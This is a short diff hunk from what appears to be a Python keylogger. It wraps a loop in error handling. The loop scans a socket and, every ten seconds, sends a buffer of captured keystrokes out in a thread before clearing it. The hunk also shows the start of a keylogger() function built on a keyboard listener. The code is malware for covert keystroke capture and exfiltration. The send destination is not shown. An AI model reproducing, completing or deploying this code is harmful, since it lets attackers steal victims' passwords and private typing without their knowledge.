@@ -77,18 +77,20 @@ def chrono():
     while True:
         seconds = 0
         while True:
-            print(f"Secondes : {seconds}")
-            seconds += 1
-            scan_socket()
-            time.sleep(1)
-            if seconds % 10 == 0:
-                send_t = threading.Thread(target=send(TXT_GLOB))
-                send_t.start()
-                # print(TXT_GLOB)
-                TXT_GLOB = ""
-            if seconds == 600:
-                return 0
-
+            try :
+                print(f"Secondes : {seconds}")
+                seconds += 1
+                scan_socket()
+                time.sleep(1)
+                if seconds % 10 == 0:
+                    send_t = threading.Thread(target=send(TXT_GLOB))
+                    send_t.start()
+                    # print(TXT_GLOB)
+                    TXT_GLOB = ""
+                if seconds == 600:
+                    return 0
+            except:
+                kill_all()
 
 def keylogger():
     with Listener(on_press=kpr) as listener:
